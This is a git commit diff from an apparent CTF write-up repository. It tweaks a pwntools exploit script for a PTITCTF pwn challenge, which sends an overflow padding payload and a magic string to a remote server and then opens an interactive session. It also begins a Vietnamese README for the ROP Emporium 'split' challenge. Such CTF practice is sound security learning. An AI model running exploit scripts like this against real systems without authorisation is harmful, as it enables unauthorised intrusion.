a778ac06886c4c47d24a09e57b9abadef481ed5f
audwc28 <auducis28@gmail.com>
2023-02-25 18:25:00 +0700

    update

--- 2023/pwn/PTITCTF/Level1/script.py
+++ 2023/pwn/PTITCTF/Level1/script.py
@@ -3,8 +3,10 @@ from pwn import *
 r = remote("54.169.55.172", 1024)
 
 r.recvuntil(b'Give me your name: ')
-payload = b'a'*41
+payload = b'a'*43
 r.sendline(payload)
 r.recvuntil(b'Now send me some thing you want :))))')
-r.sendline(b'w3Lc0m37iS')
+r.send(b'w3Lc0m37iS')
+#Si73m0cL3w
+#w3Lc0m37iS
 r.interactive()
---
+++ online/pwn/ROP Emporium/split/README.md
@@ -0,0 +1,16 @@
+**1. Tìm lỗi**
+
+Dùng lệnh 'file' kiểm tra file 
+
+![file.png](photo/file.png)
+
+Ta thấy là file 64bit -> Mở ida64 ta có một số hàm như sau
+
+Hàm main:
+
+![main.png](photo/main.png)
+
+Hàm pwnme:
+
+![pwnme.png](photo/pwnme.png)
+
